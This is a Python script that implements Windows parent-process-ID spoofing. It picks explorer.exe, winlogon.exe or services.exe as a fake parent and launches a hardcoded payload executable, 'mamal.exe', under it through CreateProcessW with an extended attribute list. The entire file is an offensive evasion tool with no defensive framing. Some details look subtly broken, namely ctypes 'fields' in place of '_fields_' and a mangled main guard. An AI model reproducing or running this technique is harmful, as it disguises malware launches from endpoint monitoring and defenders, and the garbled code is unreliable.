import ctypes
import psutil
import win32con
import win32api
import win32process
import os

from ctypes import wintypes

# Constants
EXTENDED_STARTUPINFO_PRESENT = 0x00080000
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Structures
class STARTUPINFO(ctypes.Structure):
    fields = [
        ('cb', wintypes.DWORD),
        ('lpReserved', wintypes.LPWSTR),
        ('lpDesktop', wintypes.LPWSTR),
        ('lpTitle', wintypes.LPWSTR),
        ('dwX', wintypes.DWORD),
        ('dwY', wintypes.DWORD),
        ('dwXSize', wintypes.DWORD),
        ('dwYSize', wintypes.DWORD),
        ('dwXCountChars', wintypes.DWORD),
        ('dwYCountChars', wintypes.DWORD),
        ('dwFillAttribute', wintypes.DWORD),
        ('dwFlags', wintypes.DWORD),
        ('wShowWindow', ctypes.c_ushort),
        ('cbReserved2', ctypes.c_ushort),
        ('lpReserved2', ctypes.POINTER(ctypes.c_byte)),
        ('hStdInput', wintypes.HANDLE),
        ('hStdOutput', wintypes.HANDLE),
        ('hStdError', wintypes.HANDLE),
    ]

class STARTUPINFOEX(ctypes.Structure):
    fields = [
        ('StartupInfo', STARTUPINFO),
        ('lpAttributeList', ctypes.c_void_p),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    fields = [
        ('hProcess', wintypes.HANDLE),
        ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD),
        ('dwThreadId', wintypes.DWORD),
    ]

# Functions
InitializeProcThreadAttributeList = kernel32.InitializeProcThreadAttributeList
InitializeProcThreadAttributeList.argtypes = [ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(ctypes.c_size_t)]
InitializeProcThreadAttributeList.restype = wintypes.BOOL

UpdateProcThreadAttribute = kernel32.UpdateProcThreadAttribute
UpdateProcThreadAttribute.argtypes = [ctypes.c_void_p, wintypes.DWORD, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p]
UpdateProcThreadAttribute.restype = wintypes.BOOL

DeleteProcThreadAttributeList = kernel32.DeleteProcThreadAttributeList
DeleteProcThreadAttributeList.argtypes = [ctypes.c_void_p]

CreateProcessW = kernel32.CreateProcessW
CreateProcessW.argtypes = [
    wintypes.LPCWSTR, wintypes.LPWSTR,
    wintypes.LPVOID, wintypes.LPVOID, wintypes.BOOL,
    wintypes.DWORD, wintypes.LPVOID,
    wintypes.LPCWSTR,
    ctypes.POINTER(STARTUPINFOEX),
    ctypes.POINTER(PROCESS_INFORMATION)
]
CreateProcessW.restype = wintypes.BOOL

def get_trusted_pid():
    trusted_names = ["explorer.exe", "winlogon.exe", "services.exe"]
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() in trusted_names:
            # print(f"[+] Selected trusted process: {proc.info['name']} (PID: {proc.info['pid']})")
            return proc.info['pid']
    raise Exception("No trusted process found!")

def run_with_spoofed_ppid(parent_pid, payload="C:\\Users\\vboxuser\\Desktop\\dist\\mamal.exe"):
    hParent = win32api.OpenProcess(win32con.PROCESS_CREATE_PROCESS | win32con.PROCESS_DUP_HANDLE | win32con.PROCESS_QUERY_INFORMATION, False, parent_pid)

    size = ctypes.c_size_t(0)
    InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
    attribute_list = ctypes.create_string_buffer(size.value)
    si = STARTUPINFOEX()
    si.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
    si.lpAttributeList = ctypes.cast(attribute_list, ctypes.c_void_p)

    success = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ctypes.byref(size))
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    parent_handle = ctypes.c_void_p(int(hParent))
    success = UpdateProcThreadAttribute(
        si.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        ctypes.byref(parent_handle),
        ctypes.sizeof(parent_handle),
        None,
        None
    )
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    pi = PROCESS_INFORMATION()
    success = CreateProcessW(
        None,
        ctypes.create_unicode_buffer(payload),
        None,
        None,
        False,
        EXTENDED_STARTUPINFO_PRESENT | win32con.CREATE_NEW_CONSOLE,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi)
    )
    if not success:
        raise ctypes.WinError(ctypes.get_last_error())

    try:
        child = psutil.Process(pi.dwProcessId)
        _ = child.ppid()
    except:
        pass

    win32api.CloseHandle(pi.hProcess)
    win32api.CloseHandle(pi.hThread)
    DeleteProcThreadAttributeList(si.lpAttributeList)

if name == "main":
    trusted_pid = get_trusted_pid()
    run_with_spoofed_ppid(trusted_pid)